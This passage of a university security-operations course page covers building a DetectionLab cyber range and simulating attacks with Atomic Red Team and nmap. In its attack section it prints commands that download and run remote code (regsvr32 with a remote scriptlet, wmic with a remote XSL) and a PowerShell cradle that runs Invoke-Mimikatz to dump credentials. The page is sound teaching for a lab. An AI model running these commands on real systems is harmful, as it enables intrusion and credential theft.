+<span class="g g-Whitespace">    </span><span class="mi">295</span>                 <span class="n">warnings</span><span class="o">.</span><span class="n">warn</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="ne">FutureWarning</span><span class="p">,</span> <span class="n">stacklevel</span><span class="o">=</span><span class="n">stacklevel</span><span class="p">)</span>
+<span class="ne">--&gt; </span><span class="mi">296</span>             <span class="k">return</span> <span class="n">func</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>
+<span class="g g-Whitespace">    </span><span class="mi">297</span> 
+<span class="g g-Whitespace">    </span><span class="mi">298</span>         <span class="k">return</span> <span class="n">wrapper</span>
+
+<span class="nn">~\.conda\envs\jupyterbook_env\lib\site-packages\pandas\io\json\_json.py</span> in <span class="ni">read_json</span><span class="nt">(path_or_buf, orient, typ, dtype, convert_axes, convert_dates, keep_default_dates, numpy, precise_float, date_unit, encoding, lines, chunksize, compression, nrows)</span>
+<span class="g g-Whitespace">    </span><span class="mi">616</span>         <span class="k">return</span> <span class="n">json_reader</span>
+<span class="g g-Whitespace">    </span><span class="mi">617</span> 
+<span class="ne">--&gt; </span><span class="mi">618</span>     <span class="n">result</span> <span class="o">=</span> <span class="n">json_reader</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+<span class="g g-Whitespace">    </span><span class="mi">619</span>     <span class="k">if</span> <span class="n">should_close</span><span class="p">:</span>
+<span class="g g-Whitespace">    </span><span class="mi">620</span>         <span class="n">filepath_or_buffer</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="nn">~\.conda\envs\jupyterbook_env\lib\site-packages\pandas\io\json\_json.py</span> in <span class="ni">read</span><span class="nt">(self)</span>
+<span class="g g-Whitespace">    </span><span class="mi">751</span>                 <span class="n">data</span> <span class="o">=</span> <span class="n">ensure_str</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">data</span><span class="p">)</span>
+<span class="g g-Whitespace">    </span><span class="mi">752</span>                 <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="ne">--&gt; </span><span class="mi">753</span>                 <span class="n">obj</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_get_object_parser</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">_combine_lines</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+<span class="g g-Whitespace">    </span><span class="mi">754</span>         <span class="k">else</span><span class="p">:</span>
+<span class="g g-Whitespace">    </span><span class="mi">755</span>             <span class="n">obj</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_get_object_parser</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">data</span><span class="p">)</span>
+
+<span class="nn">~\.conda\envs\jupyterbook_env\lib\site-packages\pandas\io\json\_json.py</span> in <span class="ni">_get_object_parser</span><span class="nt">(self, json)</span>
+<span class="g g-Whitespace">    </span><span class="mi">775</span>         <span class="n">obj</span> <span class="o">=</span> <span class="kc">None</span>
+<span class="g g-Whitespace">    </span><span class="mi">776</span>         <span class="k">if</span> <span class="n">typ</span> <span class="o">==</span> <span class="s2">&quot;frame&quot;</span><span class="p">:</span>
+<span class="ne">--&gt; </span><span class="mi">777</span>             <span class="n">obj</span> <span class="o">=</span> <span class="n">FrameParser</span><span class="p">(</span><span class="n">json</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span><span class="o">.</span><span class="n">parse</span><span class="p">()</span>
+<span class="g g-Whitespace">    </span><span class="mi">778</span> 
+<span class="g g-Whitespace">    </span><span class="mi">779</span>         <span class="k">if</span> <span class="n">typ</span> <span class="o">==</span> <span class="s2">&quot;series&quot;</span> <span class="ow">or</span> <span class="n">obj</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+
+<span class="nn">~\.conda\envs\jupyterbook_env\lib\site-packages\pandas\io\json\_json.py</span> in <span class="ni">parse</span><span class="nt">(self)</span>
+<span class="g g-Whitespace">    </span><span class="mi">884</span> 
+<span class="g g-Whitespace">    </span><span class="mi">885</span>         <span class="k">else</span><span class="p">:</span>
+<span class="ne">--&gt; </span><span class="mi">886</span>             <span class="bp">self</span><span class="o">.</span><span class="n">_parse_no_numpy</span><span class="p">()</span>
+<span class="g g-Whitespace">    </span><span class="mi">887</span> 
+<span class="g g-Whitespace">    </span><span class="mi">888</span>         <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">obj</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+
+<span class="nn">~\.conda\envs\jupyterbook_env\lib\site-packages\pandas\io\json\_json.py</span> in <span class="ni">_parse_no_numpy</span><span class="nt">(self)</span>
+<span class="g g-Whitespace">   </span><span class="mi">1117</span>         <span class="k">if</span> <span class="n">orient</span> <span class="o">==</span> <span class="s2">&quot;columns&quot;</span><span class="p">:</span>
+<span class="g g-Whitespace">   </span><span class="mi">1118</span>             <span class="bp">self</span><span class="o">.</span><span class="n">obj</span> <span class="o">=</span> <span class="n">DataFrame</span><span class="p">(</span>
+<span class="ne">-&gt; </span><span class="mi">1119</span>                 <span class="n">loads</span><span class="p">(</span><span class="n">json</span><span class="p">,</span> <span class="n">precise_float</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">precise_float</span><span class="p">),</span> <span class="n">dtype</span><span class="o">=</span><span class="kc">None</span>
+<span class="g g-Whitespace">   </span><span class="mi">1120</span>             <span class="p">)</span>
+<span class="g g-Whitespace">   </span><span class="mi">1121</span>         <span class="k">elif</span> <span class="n">orient</span> <span class="o">==</span> <span class="s2">&quot;split&quot;</span><span class="p">:</span>
+
+<span class="ne">ValueError</span>: Expected object or value
+</pre></div>
+</div>
+</div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span><span class="p">[</span><span class="s1">&#39;event_type&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">unique</span><span class="p">()</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>array([&#39;dns&#39;, &#39;stats&#39;, &#39;http&#39;, &#39;flow&#39;, &#39;dhcp&#39;, &#39;fileinfo&#39;, &#39;tls&#39;, &#39;alert&#39;],
+      dtype=object)
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="data-retrival">
+<h2>Data retrival<a class="headerlink" href="#data-retrival" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="osquery">
+<h3>osquery<a class="headerlink" href="#osquery" title="Permalink to this headline">¶</a></h3>
+<p><a class="reference external" href="https://www.osquery.io/">osquery</a> is a tool that was <a class="reference external" href="https://engineering.fb.com/2014/10/29/security/introducing-osquery/">originally developed by Facebook in 2014</a>, and has been widely adopted by the open-source community. There is a fantastic <a class="reference external" href="https://sroberts.medium.com/osquery-101-getting-started-78e063c4e2f7">getting started guide</a> available from Scott Roberts.</p>
+</div>
+</div>
+<div class="section" id="cyber-range">
+<h2>Cyber Range<a class="headerlink" href="#cyber-range" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="detectionlab">
+<h3>DetectionLab<a class="headerlink" href="#detectionlab" title="Permalink to this headline">¶</a></h3>
+<p><a class="reference external" href="https://www.detectionlab.network/">DetectionLab</a> is developed by Chris Long, Senior Analyst at Netflix, and offers a quick and easy way to create your own virtualised cyber range. It incorporates a number of the tools used today - Splunk, Suricata, osquery, Microsoft ATA, and more. It manages log generation and collection. It has Active Directory built in. This is a perfect set up for testing offensive and defensive security measures against a realistic virtualised infrastructure, without taking hours (or possibly days) to set up.</p>
+<p><img alt="Alt text" src="_images/000-detectionlab.png" /></p>
+<p>The DetectionLab environment is as depicted above. It consists of 4 Virtual Machines:</p>
+<ul class="simple">
+<li><p>Logger: This machine is responsible for curating all logging information from the network.</p></li>
+<li><p>DC: Domain Controller machine responsible for hosting the network Active Directory.</p></li>
+<li><p>WEF: Windows Event Forwarder responsible for logging all Microsoft Windows events.</p></li>
+<li><p>Win10: An endpoint workstation typical of a user in an organisation.</p></li>
+</ul>
+<p>Following the guide at:</p>
+<p><a class="reference external" href="https://www.detectionlab.network/deployment/windowsvm/">https://www.detectionlab.network/deployment/windowsvm/</a></p>
+<p>We will test with VMware - we need VMware Workstation Pro installed (using the UWE license key from OnTheHub).</p>
+<p>Virtualbox
+A licensed copy of VMware Workstation</p>
+<ul class="simple">
+<li><p>The <a class="reference external" href="https://www.vagrantup.com/docs/providers/vmware/installation">VMWare Desktop Vagrant plugin</a></p></li>
+<li><p>Install it with <strong>vagrant plugin install vagrant-vmware-desktop</strong>.</p></li>
+<li><p>Additionally, the <a class="reference external" href="https://www.vagrantup.com/docs/vmware/vagrant-vmware-utility.html">Vagrant VMware Utility</a> must also be installed.</p></li>
+</ul>
+<p>We have also downloaded <a class="reference external" href="https://www.packer.io/">Packer</a> (for completeness) and copied the excutable to our PATH (e.g., C:/Windows/System32 directory).</p>
+<p>We clone the DetectionLab repository: <strong>git clone <a class="reference external" href="https://github.com/clong/DetectionLab.git">https://github.com/clong/DetectionLab.git</a></strong></p>
+<p>We run: <strong>.\prepare.ps1</strong> to check our system is configured correctly (you need to be Administrator to run this script).</p>
+<p><img alt="Alt text" src="_images/001-prepare.png" /></p>
+<p>We then run: <strong>vagrant up –provider=vmware_desktop</strong> (this script should be run as a standard user)</p>
+<p><em>We did then observe an error later on, which required running <em><strong>vagrant plugin install vagrant-reload</strong></em> to resolve. We then bring vagrant up again as the previous step.</em></p>
+<p>Once the script completes, we should see 4 VMs running within VMware: logger, dc, wef, and win10. For the Windows machines, you should see the standard GUI login page.</p>
+<p>Next we run <strong>vagrant status</strong> from our host machine.</p>
+<p><img alt="" src="_images/002-status.png" /></p>
+<p>We can use SSH to access the machine - we use <strong>vagrant ssh logger</strong>.</p>
+<p><img alt="" src="_images/003-logger_ssh.png" /></p>
+<p>Use <strong>ip addr</strong> to get IP address information.</p>
+<p><img alt="" src="_images/004-logger_ip.png" /></p>
+<p>We can see that there are two IP addresses - one for each network card: 192.168.147.149 and 192.168.56.105. One of these will be for your internal VM network, and one is connected via NAT (Network Address Translation). Try to ping the addresses in a separate command window to see which response (for me, 192.168.147.149 is accessible from my host). We will refer to this as <strong>IP_ADDRESS</strong>.</p>
+<p>You can access the following from your host:</p>
+<ul class="simple">
+<li><p>Splunk: Navigate to https://<strong>IP_ADDRESS</strong>:8000. Login using admin:changeme.</p></li>
+<li><p>Fleet: Navigate to https://<strong>IP_ADDRESS</strong>:8412. Login using admin:admin123#.</p></li>
+</ul>
+<p>(Bypass the warning of using HTTPS that Chrome may present).</p>
+<p><img alt="" src="_images/005-splunk.png" /></p>
+<p><img alt="" src="_images/006-fleet.png" /></p>
+</div>
+</div>
+</div>
+<div class="tex2jax_ignore mathjax_ignore section" id="conducting-an-attack">
+<h1>Conducting an Attack<a class="headerlink" href="#conducting-an-attack" title="Permalink to this headline">¶</a></h1>
+<p>Now let’s simulate an attack on our network using Atomic Red Team from Red Canary.</p>
+<p><a class="reference external" href="https://redcanary.com/getting-started-with-atomic-red-team/">https://redcanary.com/getting-started-with-atomic-red-team/</a></p>
+<p>We will use the Regsvr32 attack flagged by Red Canary here as the third most common:</p>
+<p><a class="reference external" href="https://redcanary.com/blog/3-technique-regsvr32-t1117/">https://redcanary.com/blog/3-technique-regsvr32-t1117/</a></p>
+<p><img alt="" src="_images/007-win10.png" /></p>
+<p>MITRE’s definition, “Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe can be used to execute arbitrary binaries.”</p>
+<ul class="simple">
+<li><p>RegSvr32: regsvr32.exe /s /u /i:<a class="reference external" href="https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct">https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct</a> scrobj.dll</p></li>
+<li><p>Credential Dumping: powershell.exe “IEX (New-Object Net.WebClient).DownloadString(‘<a class="reference external" href="http://bit.ly/L3g1tCrad1e">http://bit.ly/L3g1tCrad1e</a>’); Invoke-Mimikatz -DumpCr”</p></li>
+<li><p>XSL Script Processing: wmic.exe process list /FORMAT:”<a class="reference external" href="https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl%E2%80%9D">https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl”</a></p></li>
+</ul>
+<p><img alt="" src="_images/007-win10_payload.png" /></p>
+<p>Jump back to Splunk:</p>
+<ul class="simple">
+<li><p>index=”suricata”</p></li>
+<li><p>index=”sysmon”</p></li>
+</ul>
+<div class="section" id="set-up-kali">
+<h2>Set up Kali<a class="headerlink" href="#set-up-kali" title="Permalink to this headline">¶</a></h2>
+<p>We can install a Kali Linux VM to deploy attacks against our infrastructure.</p>
+<p>Set this up using the standard Kali Linux VM (download from their website). Configure the VM to use a static network address.</p>
+<p>For my example, I will use 192.168.56.199 (Default Gateway 192.168.56.1).</p>
+<p>I can then test the connection by pinging the logger machine 192.168.56.105.</p>
+<p><img alt="" src="_images/008-kali.png" /></p>
+</div>
+</div>
+<div class="tex2jax_ignore mathjax_ignore section" id="using-nmap">
+<h1>Using nmap<a class="headerlink" href="#using-nmap" title="Permalink to this headline">¶</a></h1>
+<p>We can now start to assume the roles of offensive and defensive to examine our network in greater detail, both from an attacker’s perspective, and how this may be observed from a defender’s perspective.</p>
+<p>Firstly, let’s use nmap (network mapper) to see what services are available across the network.</p>
+<p>We can use the command <code class="docutils literal notranslate"><span class="pre">nmap</span> <span class="pre">-sS</span> <span class="pre">192.168.56.102-105</span></code> to perform a service scan across all four machines. If we want to assume we do not know the IP range beforehand, we could also do <code class="docutils literal notranslate"><span class="pre">nmap</span> <span class="pre">-sS</span> <span class="pre">192.168.56.0/24</span></code> to check all address in the subnet range.</p>
+<p><img alt="" src="_images/010-kali-nmap.png" /></p>
+<p>Useful links:</p>
+<ul class="simple">
+<li><p><a class="reference external" href="https://tranquilsec.com/setting-up-detectionlab/">https://tranquilsec.com/setting-up-detectionlab/</a></p></li>
+<li><p><a class="reference external" href="https://taosecurity.blogspot.com/2019/01/trying-detectionlab.html">https://taosecurity.blogspot.com/2019/01/trying-detectionlab.html</a></p></li>
+</ul>
+<p>Setting up Logging</p>
+<ul class="simple">
+<li><p><a class="reference external" href="https://www.eventsentry.com/blog/2018/01/powershell-p0wrh11-securing-powershell.html">https://www.eventsentry.com/blog/2018/01/powershell-p0wrh11-securing-powershell.html</a></p></li>
+<li><p><a class="reference external" href="https://www.ncsc.gov.uk/information/logging-made-easy">NCSC Logging Made Easy</a></p></li>
+<li><p><a class="reference external" href="https://www.ncsc.gov.uk/files/LME%20Installation%20Guide%20-%20October%202019.pdf">NCSC Logging Made Easy User Guide</a></p></li>
+</ul>
+<p>Detection Engineering</p>
+<ul class="simple">
+<li><p><a class="reference external" href="https://medium.com/threat-hunters-forge/sharpen-your-simulation-game-part-1-introduction-85d785cda32c">Sharpen your Simulation Game Part 1 - Introduction - Open Threat Research</a></p></li>
+<li><p><a class="reference external" href="https://redcanary.com/blog/detection-engineering/">Behind the Scenes with Red Canary’s Detection Engineering Team</a></p></li>
+<li><p><a class="reference external" href="http://detect-respond.blogspot.com/2013/03/the-pyramid-of-pain.html">The Pyramid of Pain</a></p></li>
+<li><p><a class="reference external" href="https://www.mitre.org/publications/all/ten-strategies-of-a-world-class-cybersecurity-operations-center">MITRE: Ten Strategies of a World-Class Cybersecurity Operations Center</a></p></li>
+<li><p><a class="reference external" href="https://www.foregenix.com/blog/detectionlab-for-pentesters">Detection Lab for Pentesters</a></p></li>
+</ul>
+</div>
+<div class="tex2jax_ignore mathjax_ignore section" id="detectionlab-managing-the-virtual-machines">
+<h1>DetectionLab: Managing the Virtual Machines<a class="headerlink" href="#detectionlab-managing-the-virtual-machines" title="Permalink to this headline">¶</a></h1>
+<p>All commands must be run from the “DetectionLab/Vagrant” folder:</p>
+<ul class="simple">
+<li><p>Bring up all Detection Lab hosts using Virtualbox: <strong>vagrant up –provider=virtualbox</strong></p></li>
+<li><p>Bring up all Detection Lab hosts using VMware: <strong>vagrant up –provider=vmware_desktop</strong></p></li>
+<li><p>Bring up a specific host: <strong>vagrant up <hostname></strong></p></li>
+<li><p>Restart a specific host: <strong>vagrant reload <hostname></strong></p></li>
+<li><p>Restart a specific host and re-run the provision process: <strong>vagrant reload <hostname> –provision</strong></p></li>
+<li><p>Destroy a specific host: **vagrant destroy <hostname></p></li>
+<li><p>Destroy the entire Detection Lab environment: <strong>vagrant destroy</strong> (Adding -f forces it without a prompt)</p></li>
+<li><p>SSH into a host (only works with Logger): <strong>vagrant ssh logger</strong></p></li>
+<li><p>Run a WinRM command on a host (only works with DC, WEF, and WIN10): <strong>vagrant winrm –command hostname –shell powershell <hostname></strong></p></li>
+<li><p>Check the status of each host: <strong>vagrant status</strong></p></li>
+<li><p>Suspend the lab environment: <strong>vagrant suspend</strong></p></li>
+<li><p>Resume the lab environment: <strong>vagrant resume</strong></p></li>
+<li><p>Shutdown each host: <strong>vagrant halt</strong></p></li>
+</ul>
+<p><a class="reference external" href="https://www.detectionlab.network/introduction/basicvagrant/">More Details…</a></p>
+<p>The Splunk license will only allow approx 500MB of ingest. It is therefore advised that you bring up the environment, conduct your testing, and then destroy the environment. You can then provision a new environment when required.</p>
+<p>Other lab machines (e.g., Kali, UWEcyber) can then be preserved and re-linked to the testing infrastructure. <strong>Do not store any work on the DetectionLab VMs in case these should be inaccessible</strong>.</p>
+</div>
+
+    <script type="text/x-thebe-config">
+    {
+        requestKernel: true,
+        binderOptions: {
+            repo: "binder-examples/jupyter-stacks-datascience",
+            ref: "master",
+        },
+        codeMirrorConfig: {
+            theme: "abcdef",
+            mode: "python"
+        },
+        kernelOptions: {
+            kernelName: "python3",
+            path: "./."
+        },
+        predefinedOutput: true
+    }
+    </script>
+    <script>kernelName = 'python3'</script>
+
+              </div>
+              
+            
+                <!-- Previous / next buttons -->
+<div class='prev-next-area'> 
+    <a class='left-prev' id="prev-link" href="book-02-operationsandinfrastructure.html" title="previous page">
+        <i class="fas fa-angle-left"></i>
+        <div class="prev-next-info">
+            <p class="prev-next-subtitle">previous</p>
+            <p class="prev-next-title">02 SECURITY OPERATIONS AND INCIDENT MANAGEMENT</p>
+        </div>
+    </a>
+    <a class='right-next' id="next-link" href="book-04-machinelearningandvisualisation.html" title="next page">
+    <div class="prev-next-info">
+        <p class="prev-next-subtitle">next</p>
+        <p class="prev-next-title">04 MACHINE LEARNING AND VISUALISATION</p>
+    </div>
+    <i class="fas fa-angle-right"></i>
+    </a>
+</div>
+            
+        </div>
+    </div>
+    <footer class="footer">
+  <p>
+    
+      By Prof. Phil Legg<br/>
+    
+        &copy; Copyright 2021.<br/>
+  </p>
+</footer>
+</main>
+
+
+      </div>
+    </div>
+  
+  <script src="_static/js/index.be7d3bbb2ef33a8344ce.js"></script>
+
+  </body>
+</html>
